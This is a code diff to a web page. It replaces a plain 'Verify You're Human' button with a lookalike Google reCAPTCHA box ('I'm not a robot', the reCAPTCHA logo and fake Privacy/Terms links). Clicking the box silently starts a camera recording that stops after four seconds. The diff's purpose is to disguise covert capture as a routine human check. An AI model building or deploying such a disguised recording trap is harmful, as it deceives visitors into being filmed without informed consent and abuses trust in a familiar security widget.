@@ -44,31 +44,59 @@
       cursor: pointer;
       margin: 20px;
     }
-    #verifyBox {
+    .captcha-container {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
+      border: 1px solid #ccc;
+      background: white;
+      padding: 25px 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .circleButton {
-      width: 180px;
-      height: 180px;
-      border-radius: 50%;
-      background-color: red;
-      color: white;
-      font-size: 18px;
+    .captcha-box {
       display: flex;
-      justify-content: center;
       align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
       cursor: pointer;
-      box-shadow: 0 0 12px rgba(0,0,0,0.3);
-      margin: auto;
+    }
+    .check {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #999;
+      position: relative;
+    }
+    .check.checked::after {
+      content: '✔';
+      position: absolute;
+      top: -4px;
+      left: 1px;
+      font-size: 18px;
+      color: green;
+      font-weight: bold;
+    }
+    .label-text {
+      font-size: 16px;
+    }
+    .recaptcha-info {
+      font-size: 12px;
+      color: #888;
+      text-align: left;
     }
   </style>
 </head>
-<body><div id="verifyBox">
-  <div class="circleButton" onclick="startRecordingFromClick()">Verify You're Human</div>
-</div><div id="lockIcon" onclick="unlock()" style="display:none;">🔒</div><div id="viewer">
+<body><div class="captcha-container" onclick="verifyHuman()" id="verifyBox">
+  <div class="captcha-box">
+    <div id="box" class="check"></div>
+    <div class="label-text">I'm not a robot</div>
+    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="40">
+  </div>
+  <div class="recaptcha-info">
+    reCAPTCHA – <a href="#">Privacy</a> - <a href="#">Terms</a>
+  </div>
+</div><div id="lockIcon" onclick="unlock()" style="display: none;">🔒</div>
+<div id="viewer">
   <h3>Recording Playback</h3>
   <video id="playback" controls></video>
   <br>
@@ -89,7 +117,8 @@
   let stopped = false;
   let abortRecording = false;
 
-  function startRecordingFromClick() {
+  function verifyHuman() {
+    document.getElementById("box").classList.add("checked");
     document.getElementById("verifyBox").style.display = "none";
     document.getElementById("lockIcon").style.display = "block";
     startRecording();
@@ -137,7 +166,7 @@
 
       setTimeout(() => {
         if (!stopped) stopRecording();
-      }, 4000); // auto stop after 4 seconds
+      }, 4000);
     } catch (err) {
       alert("Camera Error: " + err.message);
     }
